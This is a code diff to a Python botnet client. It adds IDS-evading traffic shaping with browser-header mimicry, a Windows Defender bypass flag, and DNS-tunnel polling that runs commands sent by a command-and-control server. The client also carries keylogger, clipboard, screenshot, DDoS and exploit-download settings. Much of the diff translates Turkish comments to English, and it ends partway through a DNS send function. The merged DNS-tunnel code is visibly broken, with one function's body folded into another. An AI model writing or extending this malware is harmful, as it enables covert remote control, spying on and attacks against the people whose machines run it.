@@ -42,12 +42,114 @@ try:
 except ImportError:
     winreg = None  # Not available on macOS/Linux
 
+class TrafficShaping:
+    """Traffic shaping for stealth communication - avoid IDS/IPS detection"""
+    
+    def __init__(self, enabled=True, base_interval=30, jitter_range=15):
+        self.enabled = enabled
+        self.base_interval = base_interval  # Base seconds between beacons
+        self.jitter_range = jitter_range    # Random +/- seconds
+        self.last_beacon = 0
+        
+        # HTTPS mimicry headers
+        self.chrome_headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'none',
+            'Sec-Fetch-User': '?1',
+            'Cache-Control': 'max-age=0',
+        }
+        
+    def calculate_jitter(self):
+        """Calculate random sleep time with jitter"""
+        if not self.enabled:
+            return 0
+        
+        jitter = random.uniform(-self.jitter_range, self.jitter_range)
+        sleep_time = self.base_interval + jitter
+        return max(5, sleep_time)  # Minimum 5 seconds
+    
+    def sleep_with_jitter(self):
+        """Sleep for calculated jitter time"""
+        sleep_time = self.calculate_jitter()
+        time.sleep(sleep_time)
+        return sleep_time
+    
+    def randomize_packet_size(self, data, min_size=1024, max_size=4096):
+        """Add padding to randomize packet size"""
+        if not self.enabled:
+            return data
+        
+        current_size = len(data)
+        target_size = random.randint(min_size, max_size)
+        
+        if current_size < target_size:
+            # Add random padding
+            padding_size = target_size - current_size - 16  # 16 bytes for length header
+            if padding_size > 0:
+                padding = os.urandom(padding_size)
+                data = struct.pack('>I', current_size) + data + padding
+        
+        return data
+    
+    def get_mimicry_headers(self, referer=None):
+        """Get browser-like headers for HTTP requests"""
+        headers = self.chrome_headers.copy()
+        if referer:
+            headers['Referer'] = referer
+        
+        # Randomize minor header values
+        headers['Accept-Language'] = random.choice([
+            'en-US,en;q=0.9',
+            'en-GB,en;q=0.8,en-US;q=0.6',
+            'en-CA,en;q=0.9,fr;q=0.5'
+        ])
+        
+        return headers
+    
+    def mimic_normal_browser_session(self, url):
+        """Make a request that looks like normal browser traffic"""
+        try:
+            headers = self.get_mimicry_headers()
+            # Add some randomness to URL
+            noise_param = f"_={random.randint(1000000000, 9999999999)}"
+            sep = '&' if '?' in url else '?'
+            url_with_noise = f"{url}{sep}{noise_param}"
+            
+            response = requests.get(
+                url_with_noise, 
+                headers=headers, 
+                timeout=random.uniform(10, 30),
+                allow_redirects=True
+            )
+            return response
+        except Exception:
+            return None
+    
+    def adaptive_sleep(self, failed_attempts=0):
+        """Increase sleep time after failed attempts (exponential backoff)"""
+        if failed_attempts == 0:
+            return self.sleep_with_jitter()
+        
+        # Exponential backoff: 30s, 60s, 120s, 240s...
+        backoff = self.base_interval * (2 ** min(failed_attempts - 1, 4))
+        jitter = random.uniform(0, self.jitter_range)
+        sleep_time = backoff + jitter
+        time.sleep(sleep_time)
+        return sleep_time
+
 class Bot:
     @staticmethod
     def _get_local_ip():
-        """Local IP adresini al"""
+        """Get local IP address"""
         try:
-            # Google DNS'ye bağlanarak local IP'yi öğren
+            # Find your local IP address by connecting to Google DNS.
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.connect(("8.8.8.8", 80))
             local_ip = sock.getsockname()[0]
@@ -56,20 +158,20 @@ class Bot:
         except:
             return "127.0.0.1"
     
-    def __init__(self, c2_host='192.168.246.191', c2_port=8080, encryption_key="SecretBotNetKey2025", anti_analysis_mode="alert"):
+    def __init__(self, c2_host='10.207.254.191', c2_port=8080, encryption_key="SecretBotNetKey2025", anti_analysis_mode="alert"):
         # Allow overriding via environment variables
         self.c2_host = os.getenv('C2_HOST', c2_host)
         try:
             self.c2_port = int(os.getenv('C2_PORT', c2_port))
         except Exception:
             self.c2_port = c2_port
-        # Eski format: sadece hostname ve UUID
+        # Old format: just hostname and UUID
         self.bot_id = f"{platform.node()}-{uuid.uuid4()}"
         self.platform = platform.system().lower()
         self.running = True
         self.keylogger_running = False
         self.keylogger_thread = None
-        self.kserver_host = "127.0.0.1"  # Keylogger server IP'si
+        self.kserver_host = "127.0.0.1"  # Keylogger's IP Adress
         self.kserver_port = 8081
         self.clipboard_active = False
         self.screenshot_active = False
@@ -78,7 +180,7 @@ class Bot:
         self.ddos_threads = []
         self.encryption_key = hashlib.sha256(encryption_key.encode()).digest()
         
-        # Anti-analiz modu: "off", "alert", "silent"
+        # Anti-analysis Mod: "off", "alert", "silent"
         self.anti_analysis_mode = anti_analysis_mode
         self.last_check_time = 0
         self.check_interval = 3
@@ -88,7 +190,7 @@ class Bot:
         self.comm_thread = None
         self.heartbeat_thread = None
         
-        # Gelişmiş İletişim Sistemi
+        # Advanced Communication System
         self.communication_config = {
             'tor_enabled': False,
             'p2p_enabled': True,
@@ -99,10 +201,10 @@ class Bot:
             'fallback_channels': True
         }
         
-        # Tor ayarları
+        # Tor Settings
         self.tor_enabled = False
 
-        # Mesh fallback ayarları
+        # Mesh fallback settings
         self.mesh_enabled = True
         self.mesh = None
         self.mesh_command_thread = None
@@ -112,12 +214,12 @@ class Bot:
             'https': 'socks5h://127.0.0.1:9050'
         }
         
-        # Gelişmiş şifreleme katmanları
+        # Advanced encryption layers
         self.encryption_layers = {
-            'layer1': 'AES-256-CBC',      # Ana şifreleme
-            'layer2': 'ChaCha20-Poly1305', # Ikinci katman
+            'layer1': 'AES-256-CBC',      # Main encryption
+            'layer2': 'ChaCha20-Poly1305', # Second layer
             'layer3': 'XOR-Obfuscation',   # Obfuscation
-            'layer4': 'Steganography'      # Gizleme
+            'layer4': 'Steganography'      # Hidden
         }
         
         # File server settings
@@ -125,20 +227,20 @@ class Bot:
         self.file_token = None
         self.token_expiry = 0
         
-        # Bağlantı rotasyonu
+        # Connect rotation
         self.connection_rotation = {
             'enabled': True,
-            'rotation_interval': 300,  # 5 dakika
+            'rotation_interval': 300,  # 5 min
             'last_rotation': 0,
             'current_channel': 'primary'
         }
         
-        # P2P ayarları
+        # P2P Settings
         self.p2p_active = False
         self.p2p_port = random.randint(49152, 65535)
         self.p2p_port_range = (49152, 65535)
         
-        # Fallback kanalları
+        # Fallback channels
         self.fallback_channels = {
             'primary': {'type': 'direct', 'port': self.c2_port},
             'secondary': {'type': 'p2p', 'port': self.p2p_port},
@@ -154,11 +256,22 @@ class Bot:
         self.ipv6_enabled = self._check_ipv6_support()
         self.ipv6_scope_id = self._get_ipv6_scope_id()
         
-        # Bağlantı yeniden deneme ayarları
+        # Connection retry settings
         self.reconnect_delay = 5
         self.max_reconnect_delay = 300
+        self.initial_reconnect_delay = 5
         
-        # Casus Yazılım Özellikleri
+        # Automatic P2P Failover Settings
+        self.p2p_failover_enabled = True  # Otomatik P2P failover aktif
+        self.c2_connection_lost_time = None  # C2 bağlantısı kesildiği zaman
+        self.p2p_failover_delay = 5  # 5 saniye sonra P2P'ye geç
+        self.c2_reconnect_interval = 60  # Her 60 saniyede bir C2'yi dene
+        self.last_c2_reconnect_attempt = 0  # Son C2 deneme zamanı
+        self.connection_mode = 'c2'  # 'c2' veya 'p2p'
+        self.failover_thread = None  # Failover monitor thread
+        self.c2_connected = False  # C2 bağlantı durumu
+        
+        # Spyware Features
         self.stealth_mode = True
         self.process_name = self._generate_stealth_process_name()
         self.file_name = self._generate_stealth_file_name()
@@ -173,8 +286,9 @@ class Bot:
         self.file_stealth = True
         self.memory_stealth = True
         
-        # Gizli çalışma ayarları
-        self.hidden_process = True
+        # Network stealth
+        self.network_stealth = True
+        self.traffic_shaping = TrafficShaping(enabled=True, base_interval=30, jitter_range=15)
         
         # Stealth systems
         self.hidden_file = True
@@ -184,21 +298,31 @@ class Bot:
         
         # Stealth Systems : Disabled
         
-        # Stealth durumları
+        # Stealth status:
         self.sandbox_detected = False
         self.vm_detected = False
         self.debugger_detected = False
         self.analysis_tools_detected = False
         
-        # Stealth modu başlat
+        # Stealth technologies configuration
+        self.stealth_technologies = {
+            'process_injection': False,
+            'memory_manipulation': False,
+            'rootkit_hooks': False,
+            'anti_analysis': False,
+            'file_hiding': False,
+            'windows_defender_bypass': True  # Auto-activate on bot startup
+        }
+        
+        # Activate stealth mode.
         self._initialize_stealth_technologies()
         
-        # Multi-layer encryption sistemini başlat (pasif modda sürekli çalışan)
+        # Initialize multi-layer encryption system (passive mode)
         self._initialize_multi_layer_encryption()
         
         # Model initialization disabled
         
-        # Güvenlik Uyarıları Sistemi
+        # Security Alert System
         self.security_alerts = []
         self.security_rules = {
             'anti_analysis': True,
@@ -212,13 +336,13 @@ class Bot:
         
         # API Rate Limiting
         self.api_rate_limits = {
-            'vulners': {'last_call': 0, 'min_interval': 2.0},  # 2 saniye
-            'nvd': {'last_call': 0, 'min_interval': 1.0},  # 1 saniye
+            'vulners': {'last_call': 0, 'min_interval': 2.0},  # 2 sec
+            'nvd': {'last_call': 0, 'min_interval': 1.0},  # 1 sec
             'securityfocus': {'last_call': 0, 'min_interval': 2.0},
             'packetstorm': {'last_call': 0, 'min_interval': 2.0}
         }
         
-        # Vulnerability Scanner Ayarları
+        # Vulnerability Scanner Settings
         self.vuln_scanner_enabled = True
         self.exploit_download_enabled = True
         self.system_info = {}
@@ -227,7 +351,7 @@ class Bot:
         self.exploit_success_rate = 0.0
         self.last_vuln_scan = 0
         
-        # Network Mapping Ayarları
+        # Network Mapping Settings
         self.network_mapping_enabled = True
         self.network_mapping_active = False
         self.network_mapping_thread = None
@@ -242,10 +366,10 @@ class Bot:
         # Clipboard monitoring
         self.clipboard_thread = None
         
-        # P2P durumu bildirimi için
+        # P2P status report
         self.p2p_status_sent = False
         
-        # Dosya yükleme/indirme
+        # File upload/download
         self.file_upload_active = False
         self.file_download_active = False
         
@@ -260,47 +384,33 @@ class Bot:
         print(f"\033[94m[*] Network Mapping: {self.network_mapping_enabled}\033[0m")
     
     def _generate_stealth_process_name(self):
-        """Gizli işlem adı oluşturur"""
         length = random.randint(8, 15)
         return ''.join(random.choices(string.ascii_letters + string.digits, k=10))
     
     def _generate_stealth_file_name(self):
-        """Gizli dosya adı oluşturur"""
         length = random.randint(8, 15)
         return ''.join(random.choice(string.ascii_lowercase) for i in range(length)) + ".exe"
     
     def _generate_stealth_registry_key(self):
-        """
-        Gizli bir kayıt defteri anahtarı oluşturur.
-        Gerçek uygulamada, bu işlev, meşru görünen veya rastgele dize tabanlı bir kayıt defteri anahtarı oluşturmak için karmaşık algoritmalar içerebilir.
-        """
         length = random.randint(8, 15)
         return ''.join(random.choice(string.ascii_lowercase) for i in range(length))
     
     def _choose_startup_method(self):
-        """
-        Botun başlangıç yöntemini seçer.
-        Gerçek uygulamada, bu işlev, farklı başlangıç yöntemleri (örneğin, kayıt defteri, başlangıç klasörü, görev zamanlayıcı) arasında seçim yapmak için algoritmalar içerebilir.
-        """
-        # Örnek: Varsayılan olarak kayıt defteri yöntemini seç
         return "registry"
     
     # Stealth Start Funcs : Disabled 
 
     def _initialize_multi_layer_encryption(self):
-        """
-        Çok katmanlı şifreleme sistemi başlatır.
-        """
         try:
             print(f"\033[94m[*] Multi-layer encryption initializing...\033[0m")
             
-            # Encryption key'leri oluştur
+            # Create Encryption Key
             self._generate_encryption_keys()
             
-            # Encryption katmanlarını test et
+            # Test the encryption layers.
             self._test_encryption_layers()
             
-            # Encryption monitoring thread'ini başlat
+            # Start Encryption monitoring thread
             encryption_thread = threading.Thread(target=self._encryption_monitoring_loop, daemon=True)
             encryption_thread.start()
             
@@ -317,116 +427,14 @@ class Bot:
         """Model initialization disabled."""
         self.models_loaded = False
         return False
-
-    
-    def _powerful_signature_system(self):
-        """
-        Signature System : Disabled :(
-        """
-        return {'status': 'disabled'}
-    
-    def _powerful_obfuscation(self):
-        """
-        Strong Obfuscation System.
-        """
-        return True
-    
-    def _powerful_stealth_mode(self):
-        """
-        Güçlü stealth mode.
-        """
-        return True
-
-    def _powerful_anti_analysis(self):
-        """
-        Güçlü anti-analysis kontrolü.
-        """
-        return False
-
-    def _powerful_vm_detection(self):
-        """
-        Güçlü VM kontrolü.
-        """
-        return False
-    
-    def _auto_system_copy(self):
-        """Auto-copy disabled for safety"""
-        return {"status": "disabled", "message": "Auto-copy disabled for safety"}
-        """
-        Otomatik sistem kopyalama sistemi.
-        """
-        return {'status': 'success', 'message': 'System copy completed'}
-
-    def _create_persistence_mechanism(self):
-        """Persistence disabled for safety"""
-        return {"status": "disabled", "message": "Persistence disabled for safety"}
-        """
-        Kalıcılık mekanizması oluşturur.
-        """
-        pass
-
-    def _continuous_stealth_check(self):
-        """
-        Sürekli gizlilik kontrolü yapar.
-        """
-        pass
-
-    def _analyze_system_data(self):
-        """
-        System Data Analyze : Disabled :(
-        """
-        return {'status': 'disabled'}
-
-    def system_analysis(self, target_data=None):
-        """
-        System Analysis : Disabled :(
-        """
-        return {'status': 'disabled'}
-
-    def system_behavior_check(self, user_actions=None):
-        """
-        System behavior Check : Disabled :(
-        """
-        return {'status': 'disabled'}
-    
-    def network_optimization(self, network_data=None):
-        """
-        Network Optimization System : Disabled :(
-        """
-        return {'status': 'disabled'}
-
-    def target_analysis(self, target_ip=None):
-        """
-        Target Analysis System : Disabled :(
-        """
-        return {'status': 'disabled'}
-
-    def vulnerability_scanner_system(self):
-        """Sistem zafiyetlerini tarar (aktif sürüm)."""
-        return self._vulnerability_scanner_impl()
-    
-    def auto_exploit_system(self, target_ip=None):
-        return {'status': 'disabled'}
-
-    def ddos_attack_system(self, target_ip=None):
-        return {'status': 'disabled'}
-
-    def auto_vulnerability_research(self):
-        return {'status': 'disabled'}
     
     def start_network_mapping(self, scope):
-        """
-        Network mapping başlatır.
-        """
         self.network_mapping_active = True
         self.current_scope = scope
         self.mapping_start_time = time.time()
         return {'status': 'started', 'scope': scope}
 
     def get_network_mapping_status(self):
-        """
-        Network mapping durumu.
-        """
         return {
             'active_mappings': self.network_mapping_active,
             'current_scope': self.current_scope,
@@ -436,58 +444,24 @@ class Bot:
         }
     
     def stop_network_mapping(self):
-        """
-        Network mapping durdurur.
-        """
         self.network_mapping_active = False
         return {'status': 'stopped'}
 
     def _add_security_alert(self, alert_type, message, severity):
-        """
-        Güvenlik uyarısı ekler.
-        """
         self.security_alerts.append({'type': alert_type, 'message': message, 'severity': severity, 'timestamp': time.time()})
 
     def get_current_user(self):
-        """
-        Mevcut kullanıcı adını döndürür.
-        """
         return os.getlogin()
     
     def get_current_directory(self):
-        """
-        Mevcut çalışma dizinini döndürür.
-        """
         return os.getcwd()
 
     def list_directory(self):
-        """
-        Mevcut dizini listeler.
-        """
         return "\n".join(os.listdir('.'))
-
-    def _attempt_privilege_escalation(self):
-        """
-        Privilege escalation denemesi yapar.
-        """
-        return False
-
-    def _get_network_analysis(self):
-        """
-        Network analizi döndürür.
-        """
-        return {}
 
     # Big AI, MLL Funcs : Disabled :(
 
-    def _get_network_optimization_data(self):
-        """
-        Network optimizasyon verilerini döndürür.
-        """
-        return {}
-
     def _check_ipv6_support(self):
-        """IPv6 desteğini kontrol eder"""
         try:
             with socket.socket(socket.AF_INET6, socket.SOCK_STREAM) as s:
                 s.bind(('::1', 0))
@@ -496,10 +470,9 @@ class Bot:
             return False
     
     def _get_ipv6_scope_id(self):
-        """IPv6 scope ID'sini alır (Windows için)"""
         try:
             if platform.system() == 'Windows':
-                # Windows'ta aktif ağ arayüzünü bul
+                # Find the active network interface in Windows.
                 interfaces = socket.if_nameindex()
                 for iface in interfaces:
                     if 'Ethernet' in iface[1] or 'Wi-Fi' in iface[1]:
@@ -511,7 +484,6 @@ class Bot:
             return 0
     
     def encrypt_data(self, data):
-        """Çok katmanlı şifreleme sistemi"""
         if isinstance(data, str):
             data = data.encode('utf-8')
         
@@ -521,73 +493,67 @@ class Bot:
         padded_data = pad(data, AES.block_size)
         layer1_encrypted = cipher.encrypt(padded_data)
         
-        # Layer 2: ChaCha20-Poly1305 (simüle edilmiş)
+        # Layer 2: ChaCha20-Poly1305
         chacha_key = hashlib.sha256(self.encryption_key + b'chacha').digest()
         chacha_nonce = get_random_bytes(12)
-        # Basit XOR ile ChaCha20 simülasyonu
+        # Simple XOR with ChaCha20
         layer2_encrypted = bytes(a ^ b for a, b in zip(layer1_encrypted, chacha_key[:len(layer1_encrypted)]))
         
         # Layer 3: XOR Obfuscation
         obfuscation_key = get_random_bytes(32)
         layer3_encrypted = bytes(a ^ b for a, b in zip(layer2_encrypted, obfuscation_key[:len(layer2_encrypted)]))
         
-        # Layer 4: Steganography (basit gizleme)
+        # Layer 4: Steganography
         stego_data = self._apply_steganography(layer3_encrypted)
         
-        # Tüm katmanları birleştir
+        # Combine all layers
         final_data = iv + chacha_nonce + obfuscation_key + stego_data
         
         return final_data
 
     def encrypt_c2(self, data):
-        """C2 ile uyumlu AES-256-GCM şifreleme (nonce + ciphertext + tag).
-        Server.py'deki encrypt_data ile birebir uyumludur."""
         if isinstance(data, str):
             data = data.encode('utf-8')
-        # 12 bayt nonce (GCM için önerilen)
+        # 12 bayt nonce
         nonce = get_random_bytes(12)
         cipher = AES.new(self.encryption_key, AES.MODE_GCM, nonce=nonce)
         ciphertext, tag = cipher.encrypt_and_digest(data)
         return nonce + ciphertext + tag
 
     def _apply_steganography(self, data):
-        """Basit steganografi uygula"""
-        # Veriyi normal HTTP trafiği gibi gizle
         stego_header = b'HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n'
         stego_footer = b'\r\n\r\n'
         
-        # Veriyi base64 ile kodla
         encoded_data = base64.b64encode(data)
         
         return stego_header + encoded_data + stego_footer
 
     def decrypt_data(self, encrypted_data):
-        """Çok katmanlı şifreleme çözme"""
         try:
-            # Katmanları ayır
+            # Separate layers
             iv = encrypted_data[:16]
             chacha_nonce = encrypted_data[16:28]
             obfuscation_key = encrypted_data[28:60]
             stego_data = encrypted_data[60:]
             
-            # Katman 4: Steganography çöz
+            # Layer 4: Steganography 
             layer3_encrypted = self._extract_steganography(stego_data)
             
-            # Katman 3: XOR Obfuscation çöz
+            # Layer 3: XOR Obfuscation 
             layer2_encrypted = bytes(a ^ b for a, b in zip(layer3_encrypted, obfuscation_key[:len(layer3_encrypted)]))
             
-            # Katman 2: ChaCha20 çöz (simüle edilmiş)
+            # Layer 2: ChaCha20 
             chacha_key = hashlib.sha256(self.encryption_key + b'chacha').digest()
             layer1_encrypted = bytes(a ^ b for a, b in zip(layer2_encrypted, chacha_key[:len(layer2_encrypted)]))
             
-            # Katman 1: AES-256-CBC çöz
+            # Layer 1: AES-256-CBC 
             cipher = AES.new(self.encryption_key, AES.MODE_CBC, iv)
             decrypted_data = unpad(cipher.decrypt(layer1_encrypted), AES.block_size)
             
             return decrypted_data.decode('utf-8')
             
         except Exception as e:
-            # Eski format için fallback
+            # Fallback for the old format.
             try:
                 iv = encrypted_data[:16]
                 actual_data = encrypted_data[16:]
@@ -598,8 +564,6 @@ class Bot:
                 raise e
     
     def decrypt_c2(self, encrypted_data):
-        """C2'dan gelen veriler için AES-256-GCM çözme (nonce + ciphertext + tag).
-        CBC formatı için geriye dönük uyumluluk içerir."""
         try:
             # Nonce ilk 12 bayt, tag son 16 bayt
             if len(encrypted_data) >= 12 + 16:
@@ -609,10 +573,8 @@ class Bot:
                 cipher = AES.new(self.encryption_key, AES.MODE_GCM, nonce=nonce)
                 decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                 return decrypted.decode('utf-8')
-            # Yetersiz uzunluksa CBC'ye düş
             raise ValueError("Encrypted payload too short for GCM")
         except Exception:
-            # CBC geri dönüş uyumluluğu
             try:
                 iv = encrypted_data[:16]
                 actual = encrypted_data[16:]
@@ -623,31 +585,23 @@ class Bot:
                 return ''
 
     def _extract_steganography(self, stego_data):
-        """Steganografi verisini çıkar"""
-        # HTTP header'ını kaldır
         if stego_data.startswith(b'HTTP/1.1 200 OK'):
-            # Header'ı bul ve kaldır
             header_end = stego_data.find(b'\r\n\r\n')
             if header_end != -1:
                 encoded_data = stego_data[header_end + 4:]
-                # Footer'ı kaldır
                 if encoded_data.endswith(b'\r\n\r\n'):
                     encoded_data = encoded_data[:-4]
-                # Base64 decode
                 return base64.b64decode(encoded_data)
         
         return stego_data
 
     def connect(self):
-        """Gelişmiş bağlantı sistemi"""
         try:
-            # Bağlantı rotasyonu kontrolü
             if self.connection_rotation['enabled']:
                 current_time = time.time()
                 if current_time - self.connection_rotation['last_rotation'] > self.connection_rotation['rotation_interval']:
                     self._rotate_connection()
             
-            # Mevcut kanal tipine göre bağlan
             channel = self.fallback_channels[self.connection_rotation['current_channel']]
             
             if channel['type'] == 'direct':
@@ -662,11 +616,10 @@ class Bot:
                 return self._connect_direct()  # Fallback
                 
         except Exception as e:
-            print(f"\033[91m[!] Bağlantı hatası: {str(e)}\033[0m")
+            print(f"\033[91m[!] Connection Eror: {str(e)}\033[0m")
             return self._try_fallback_connection()
     
     def _connect_direct(self):
-        """Doğrudan bağlantı"""
         candidates = []
         # Primary configured host first
         if self.c2_host:
@@ -696,7 +649,7 @@ class Bot:
                 # If we got here, connection is established
                 self.c2_host = host  # normalize to the successful host
                 self._send_bot_info(sock)
-                print(f"\033[92m[+] Doğrudan bağlantı kuruldu: {self.c2_host}:{self.c2_port}\033[0m")
+                print(f"\033[92m[+] Connection established: {self.c2_host}:{self.c2_port}\033[0m")
                 self._stop_mesh()
                 return sock
             except Exception as e:
@@ -704,17 +657,16 @@ class Bot:
                 continue
 
         if last_err:
-            print(f"\033[93m[!] Doğrudan bağlantı hatası: {str(last_err)}\033[0m")
+            print(f"\033[93m[!] Connection Eror: {str(last_err)}\033[0m")
         return None
     
     def _connect_tor(self):
-        """Tor üzerinden bağlantı"""
         try:
             if not self.tor_enabled:
-                print(f"\033[93m[!] Tor devre dışı, doğrudan bağlantı deneniyor\033[0m")
+                print(f"\033[93m[!] Tor is disabled, Trying to connect\033[0m")
                 return self._connect_direct()
             
-            # Tor SOCKS proxy kullan
+            # Use Tor SOCKS Proxy
             import socks
             
             sock = socks.socksocket()
@@ -724,31 +676,28 @@ class Bot:
             sock.connect((self.c2_host, self.c2_port))
             
             self._send_bot_info(sock)
-            print(f"\033[92m[+] Tor bağlantısı kuruldu: {self.c2_host}:{self.c2_port}\033[0m")
-            # Mesh çalışıyorsa durdur
+            print(f"\033[92m[+] Tor connection established.: {self.c2_host}:{self.c2_port}\033[0m")
+            # Stop the mesh if it's running.
             self._stop_mesh()
             return sock
             
         except Exception as e:
-            print(f"\033[93m[!] Tor bağlantı hatası: {str(e)}\033[0m")
+            print(f"\033[93m[!] Tor Connection Eror: {str(e)}\033[0m")
             return None
     
     def _connect_p2p(self):
-        """P2P bağlantısı"""
+        """P2P Connection"""
         try:
-            # P2P ağı üzerinden bağlan
             if not self.p2p_active:
-                print(f"\033[93m[!] P2P devre dışı, doğrudan bağlantı deneniyor\033[0m")
+                print(f"\033[93m[!] P2P is disabled, Trying to Connect\033[0m")
                 return self._connect_direct()
             
-            # P2P peer'ları üzerinden bağlan
             for peer_ip, peer_port in self.known_peers:
                 try:
                     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     sock.settimeout(10)
                     sock.connect((peer_ip, peer_port))
                     
-                    # P2P üzerinden C2'ye yönlendir
                     p2p_message = {
                         'action': 'route_to_c2',
                         'target_host': self.c2_host,
@@ -761,32 +710,28 @@ class Bot:
                     
                     if response:
                         self._send_bot_info(sock)
-                        print(f"\033[92m[+] P2P bağlantısı kuruldu: {peer_ip}:{peer_port}\033[0m")
+                        print(f"\033[92m[+] P2P connection established: {peer_ip}:{peer_port}\033[0m")
                         return sock
                         
                 except:
                     continue
             
-            print(f"\033[93m[!] P2P bağlantı başarısız, doğrudan bağlantı deneniyor\033[0m")
+            print(f"\033[93m[!] P2P is disabled, Trying to Connect\033[0m")
             return self._connect_direct()
             
         except Exception as e:
-            print(f"\033[93m[!] P2P bağlantı hatası: {str(e)}\033[0m")
+            print(f"\033[93m[!] P2P Connection Eror: {str(e)}\033[0m")
             return None
     
     def _connect_dns_tunnel(self):
-        """DNS Tunnel bağlantısı (emergency)"""
+        """DNS Tunnel Connection (emergency)"""
         try:
-            print(f"\033[94m[*] DNS Tunnel connection starting...\033[0m")
+            print(f"\033[94m[*] DNS Tunnel connection is starting...\033[0m")
             
-            # DNS tunnel domain kontrolü
             if not self.dns_tunnel_domain:
-                # İlk bağlantıda domain'i server'dan al
-                # Şimdilik varsayılan domain kullan
                 self.dns_tunnel_domain = f"{self.c2_host}.dns.tunnel"
                 print(f"\033[93m[*] Using default domain: {self.dns_tunnel_domain}\033[0m")
             
-            # Bot bilgilerini hazırla
             bot_data = {
                 'bot_id': self.bot_id,
                 'action': 'dns_tunnel_connect',
@@ -796,35 +741,27 @@ class Bot:
                 'hostname': socket.gethostname()
             }
             
-            # Veriyi şifrele
             encrypted_data = self.encrypt_data(json.dumps(bot_data))
             
-            # Base64 encode ve URL-safe yap
             encoded_data = base64.b64encode(encrypted_data).decode('utf-8')
             encoded_data = encoded_data.replace('+', '-').replace('/', '_').replace('=', '')
             
-            # DNS query oluştur
             # Format: <base64_data>.<domain>
             dns_query = f"{encoded_data}.{self.dns_tunnel_domain}"
             
             print(f"\033[94m[*] Sending DNS query...\033[0m")
             print(f"  \033[96m•\033[0m Query: {dns_query[:50]}...")
             
-            # DNS query gönder
             try:
                 import dns.resolver
                 
-                # TXT record sorgula
                 answers = dns.resolver.resolve(dns_query, 'TXT')
                 
                 for rdata in answers:
                     response_data = str(rdata).strip('"')
                     
-                    # Response'u decode et
                     try:
-                        # URL-safe karakterleri geri çevir
                         response_data = response_data.replace('-', '+').replace('_', '/')
-                        # Padding ekle
                         padding = 4 - (len(response_data) % 4)
                         if padding != 4:
                             response_data += '=' * padding
@@ -837,8 +774,15 @@ class Bot:
                             print(f"\033[92m[+] DNS Tunnel connection established\033[0m")
                             print(f"  \033[96m•\033[0m Domain: {self.dns_tunnel_domain}")
                             
-                            # Dummy socket döndür (DNS tunnel için gerçek socket yok)
-                            # Komutlar DNS query olarak gidecek
+                            # Check for commands in DNS response
+                            if response_json.get('has_command'):
+                                command_data = response_json.get('command', {})
+                                command = command_data.get('command')
+                                if command:
+                                    print(f"\033[95m[DNS Tunnel] Command received: {command}\033[0m")
+                                    # Execute command in separate thread
+                                    threading.Thread(target=self._execute_dns_command, args=(command,), daemon=True).start()
+                            
                             return self._create_dns_tunnel_socket()
                     
                     except Exception as e:
@@ -857,23 +801,78 @@ class Bot:
             print(f"\033[91m[!] DNS Tunnel error: {str(e)}\033[0m")
             return None
     
-    def _create_dns_tunnel_socket(self):
-        """DNS Tunnel için dummy socket oluştur"""
+    def _execute_dns_command(self, command):
+        """Execute command received via DNS tunnel"""
         try:
-            # DNS Tunnel için gerçek socket yok, sadece placeholder
-            # Komutlar DNS query olarak gönderilecek
+            print(f"\033[94m[DNS Tunnel] Executing: {command}\033[0m")
+            output = self.execute_command(command)
+            print(f"\033[92m[DNS Tunnel] Command completed\033[0m")
+            # Store output for later retrieval (could be sent via next DNS query)
+            self.last_dns_output = output
+        except Exception as e:
+            print(f"\033[91m[!] DNS command execution error: {e}\033[0m")
+    
+    def _poll_dns_commands(self):
+        """Poll for commands via DNS queries"""
+        while self.running and self.connection_rotation.get('current_channel') == 'emergency':
+            try:
+                time.sleep(30)  # Poll every 30 seconds
+                if not self.dns_tunnel_domain:
+                    continue
+                
+                # Create poll query
+                poll_data = {
+                    'bot_id': self.bot_id,
+                    'action': 'poll_commands',
+                    'timestamp': time.time()
+                }
+                
+                encrypted_data = self.encrypt_data(json.dumps(poll_data))
+                encoded_data = base64.b64encode(encrypted_data).decode('utf-8')
+                encoded_data = encoded_data.replace('+', '-').replace('/', '_').replace('=', '')
+                dns_query = f"{encoded_data}.{self.dns_tunnel_domain}"
+                
+                # Send query
+                import dns.resolver
+                answers = dns.resolver.resolve(dns_query, 'TXT')
+                
+                for rdata in answers:
+                    response_data = str(rdata).strip('"')
+                    response_data = response_data.replace('-', '+').replace('_', '/')
+                    padding = 4 - (len(response_data) % 4)
+                    if padding != 4:
+                        response_data += '=' * padding
+                    
+                    decoded_response = base64.b64decode(response_data)
+                    decrypted_response = self.decrypt_data(decoded_response)
+                    response_json = json.loads(decrypted_response.decode('utf-8'))
+                    
+                    if response_json.get('has_command'):
+                        command_data = response_json.get('command', {})
+                        command = command_data.get('command')
+                        if command:
+                            print(f"\033[95m[DNS Poll] Command received: {command}\033[0m")
+                            threading.Thread(target=self._execute_dns_command, args=(command,), daemon=True).start()
+                            
+            except Exception as e:
+                pass  # Silently continue on errors
+        """Create dummy socket for DNS Tunnel"""
+        try:
             
             class DNSTunnelSocket:
                 def __init__(self, bot):
                     self.bot = bot
                     self.closed = False
+                    # Start DNS command polling in background
+                    self.poll_thread = threading.Thread(target=self.bot._poll_dns_commands, daemon=True)
+                    self.poll_thread.start()
                 
                 def send(self, data):
-                    # DNS query olarak gönder
                     return self.bot._send_via_dns(data)
                 
                 def recv(self, size):
-                    # DNS response bekle
+                    # DNS Tunnel is one-way, return empty for now
+                    # In future: implement response retrieval via separate DNS query
                     return b''
                 
                 def close(self):
@@ -889,36 +888,32 @@ class Bot:
             return None
     
     def _send_via_dns(self, data):
-        """Veriyi DNS query olarak gönder"""
         try:
             import dns.resolver
             
-            # Veriyi encode et
             encoded_data = base64.b64encode(data).decode('utf-8')
             encoded_data = encoded_data.replace('+', '-').replace('/', '_').replace('=', '')
             
-            # DNS query oluştur
